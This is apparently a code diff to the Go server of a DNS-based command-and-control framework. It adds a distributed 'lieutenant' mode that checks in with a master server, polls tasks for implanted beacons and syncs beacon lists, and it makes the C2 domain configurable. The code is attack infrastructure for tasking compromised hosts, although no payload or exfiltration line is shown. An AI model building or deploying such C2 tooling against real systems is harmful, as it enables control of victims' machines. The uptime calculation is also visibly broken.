@@ -19,8 +19,9 @@ import (
 
 // Global variables
 var (
-	c2Manager *C2Manager // c2Manager handles all C2 operations including beacon management and tasking
-	debugMode bool       // debugMode enables verbose logging for troubleshooting
+	c2Manager    *C2Manager    // c2Manager handles all C2 operations including beacon management and tasking
+	masterClient *MasterClient // masterClient handles communication with Master Server (distributed mode only)
+	debugMode    bool          // debugMode enables verbose logging for troubleshooting
 )
 
 // Build-time version information (set via -ldflags during build)
@@ -475,7 +476,7 @@ func main() {
 	}
 
 	// Initialize C2Manager with database for persistence
-	c2Manager = NewC2Manager(debugMode, cfg.EncryptionKey, cfg.StagerJitter, DatabaseFileName)
+	c2Manager = NewC2Manager(debugMode, cfg.EncryptionKey, cfg.StagerJitter, DatabaseFileName, cfg.Domain)
 
 	bindAddr := fmt.Sprintf("%s:%d", cfg.BindAddr, cfg.BindPort)
 
@@ -524,10 +525,81 @@ func main() {
 		fmt.Println("WARNING: Binding to 0.0.0.0 - responses may come from unexpected interface")
 	}
 
-	fmt.Println("C2 Management Console: Use 'help' for available commands")
+	// Check operation mode and initialize accordingly
+	if cfg.IsDistributedMode() {
+		// DISTRIBUTED MODE: Connect to Master Server
+		fmt.Printf("\n\033[0;36m==================================================\033[0m\n")
+		fmt.Printf("\033[0;36mMode: DISTRIBUTED (Lieutenant)\033[0m\n")
+		fmt.Printf("Master Server: %s\n", cfg.MasterServer)
+		fmt.Printf("Server ID: %s\n", cfg.MasterServerID)
+		fmt.Printf("\033[0;36m==================================================\033[0m\n\n")
 
-	// Start C2 management console in a separate goroutine
-	go startC2Console()
+		// Initialize Master Client
+		masterClient = NewMasterClient(cfg.MasterServer, cfg.MasterServerID, cfg.MasterAPIKey, debugMode)
+
+		// Perform initial check-in
+		fmt.Println("Connecting to Master Server...")
+		stats := map[string]interface{}{
+			"domain":       cfg.Domain,
+			"bind_addr":    cfg.BindAddr,
+			"beacon_count": 0,
+			"startup_time": time.Now().Unix(),
+		}
+
+		if err := masterClient.Checkin(stats); err != nil {
+			fmt.Printf("⚠️  WARNING: Initial checkin to Master Server failed: %v\n", err)
+			fmt.Println("Continuing in resilient mode (will retry in background)")
+		} else {
+			fmt.Println("✓ Connected to Master Server successfully")
+		}
+
+		// Start periodic check-in (every 30 seconds)
+		masterClient.StartPeriodicCheckin(30*time.Second, func() map[string]interface{} {
+			beacons := c2Manager.GetBeacons()
+			return map[string]interface{}{
+				"domain":       cfg.Domain,
+				"bind_addr":    cfg.BindAddr,
+				"beacon_count": len(beacons),
+				"uptime":       time.Since(time.Now()).Seconds(),
+			}
+		})
+
+		// Start periodic task polling (every 10 seconds)
+		masterClient.StartPeriodicTaskPoll(10*time.Second, func(tasks []TaskResponse) {
+			for _, task := range tasks {
+				// Queue task in C2Manager
+				c2Manager.AddTask(task.BeaconID, task.Command)
+				if debugMode {
+					logf("[Distributed] Received task %s from master for beacon %s", task.ID, task.BeaconID)
+				}
+			}
+		})
+
+		// Start periodic beacon sync (every 30 seconds)
+		// This ensures all DNS servers know about beacons registered on other servers
+		masterClient.StartPeriodicBeaconSync(30*time.Second, func(beacons []BeaconData) {
+			for _, beaconData := range beacons {
+				// Sync beacon to local C2Manager
+				c2Manager.SyncBeaconFromMaster(beaconData)
+			}
+			if debugMode {
+				logf("[Distributed] Synced %d beacon(s) from master", len(beacons))
+			}
+		})
+
+		fmt.Println("Console disabled (distributed mode)")
+		fmt.Println()
+	} else {
+		// STANDALONE MODE: Start interactive console
+		fmt.Printf("\n\033[0;32m==================================================\033[0m\n")
+		fmt.Printf("\033[0;32mMode: STANDALONE\033[0m\n")
+		fmt.Printf("Console: Interactive\n")
+		fmt.Printf("\033[0;32m==================================================\033[0m\n\n")
+		fmt.Println("C2 Management Console: Use 'help' for available commands")
+
+		// Start C2 management console in a separate goroutine
+		go startC2Console()
+	}
 
 	// Increase read buffer if needed for performance
 	_ = pc.SetReadDeadline(time.Time{})
@@ -551,7 +623,7 @@ func main() {
 						raddr.String(), msg.Header.ID, q.Name, q.Type, q.Class)
 
 					// Check if this looks like C2 traffic
-					if strings.Contains(qname, "secwolf.net") {
+					if strings.Contains(qname, cfg.Domain) {
 						parts := strings.SplitN(qname, ".", 2)
 						if len(parts) > 0 && len(parts[0]) > 20 {
 							logf("Possible C2 traffic detected from %s", raddr.String())
